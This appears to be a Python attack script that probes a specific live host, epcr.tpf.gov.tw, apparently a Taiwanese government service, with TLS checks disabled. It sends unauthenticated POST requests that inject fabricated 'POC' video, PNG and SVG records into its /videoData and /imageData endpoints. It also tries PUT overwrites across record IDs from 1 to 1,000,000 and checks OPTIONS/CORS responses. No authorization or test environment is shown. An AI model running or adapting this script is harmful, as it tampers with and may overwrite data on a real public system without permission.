#!/usr/bin/env python3
"""Phase 2-C: 尝试完整字段 + 真实 fileData base64 + 各种生成时间戳格式"""
import http.client, json, ssl, urllib.parse, base64, sys
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=20):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

host = 'epcr.tpf.gov.tw'

# 真实 fileData base64（一个最小化的 PNG/SVG）
real_b64_png = base64.b64encode(b'\x89PNG\r\n\x1a\n' + b'fake png data' * 100).decode()
real_b64_svg = base64.b64encode(b'<svg xmlns="http://www.w3.org/2000/svg"><text>test</text></svg>').decode()
real_b64_mp4 = base64.b64encode(b'fake mp4 data' * 1000).decode()

print("="*80)
print("Phase 2-C1: form-urlencoded 完整字段（带真实 base64 fileData）")
print("="*80)
# JSON 完整版本（带真实 fileData）
for payload_name, body_dict in [
    ("video-png-b64", {
        "fileName": "[iPhone][POC-COMPLETE]poc12345",
        "fileData": real_b64_png,
        "mimeType": "video/mp4",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "VideoType": 1,
        "recordUuid": "poc-complete-001"
    }),
    ("video-mp4-b64", {
        "fileName": "[iPhone][POC-COMPLETE]mp4poc12345",
        "fileData": real_b64_mp4,
        "mimeType": "video/mp4",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "VideoType": 2,
        "recordUuid": "poc-mp4-001"
    }),
    ("video-no-type", {
        "fileName": "[iPhone][POC-COMPLETE]noType12345",
        "fileData": real_b64_mp4,
        "mimeType": "video/mp4",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "recordUuid": "poc-notype-001"
    }),
]:
    body = json.dumps(body_dict)
    s, b, _ = req(host, 4001, 'POST', '/videoData', body=body, headers={'Content-Type': 'application/json'})
    print(f"  {payload_name:30s} → status={s} body={b[:300]!r}")

print()
print("="*80)
print("Phase 2-C2: imageData 完整字段")
print("="*80)
for payload_name, body_dict in [
    ("img-png", {
        "fileName": "POC-IMG-png",
        "fileData": real_b64_png,
        "mimeType": "image/png",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "ImageType": 1,
        "recordUuid": "poc-img-001"
    }),
    ("img-svg", {
        "fileName": "POC-IMG-svg",
        "fileData": real_b64_svg,
        "mimeType": "image/svg+xml",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "ImageType": 1,
        "recordUuid": "poc-svg-001"
    }),
    ("img-no-type", {
        "fileName": "POC-IMG-noType",
        "fileData": real_b64_png,
        "mimeType": "image/png",
        "generatedAt": "2026-08-30T04:00:00.000Z",
        "recordUuid": "poc-img-notype-001"
    }),
]:
    body = json.dumps(body_dict)
    s, b, _ = req(host, 4001, 'POST', '/imageData', body=body, headers={'Content-Type': 'application/json'})
    print(f"  {payload_name:30s} → status={s} body={b[:300]!r}")

print()
print("="*80)
print("Phase 2-C3: PUT /videoData/1 带不同 ID 看是否存在可更新记录")
print("="*80)
for vid_id in [1, 100, 1000, 100000, 1000000]:
    body = json.dumps({
        "fileName": f"PUT-update-{vid_id}",
        "fileData": real_b64_png,
        "mimeType": "video/mp4",
        "VideoType": 1
    })
    s, b, _ = req(host, 4001, 'PUT', f'/videoData/{vid_id}', body=body, headers={'Content-Type': 'application/json'})
    print(f"  PUT /videoData/{vid_id} → status={s} body={b[:200]!r}")

# OPTIONS - 直接测试，避免超时
print()
print("="*80)
print("Phase 2-C4: OPTIONS 测试（短超时）")
print("="*80)
import socket
def quick_options(port, path):
    try:
        cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=5)
        cn.request('OPTIONS', path, headers={'User-Agent': 'curl/8.0'})
        r = cn.getresponse()
        rb = r.read()
        cn.close()
        return r.status, rb, dict(r.getheaders())
    except Exception as e:
        return 'TIMEOUT', str(e).encode(), {}

for path in ['/videoData', '/imageData', '/videoData/1', '/imageData/1']:
    s, b, h = quick_options(4001, path)
    allow = h.get('Allow', '-')
    acao = h.get('Access-Control-Allow-Origin', '-')
    print(f"  OPTIONS {path:20s} → {s}  Allow={allow}  ACAO={acao}")

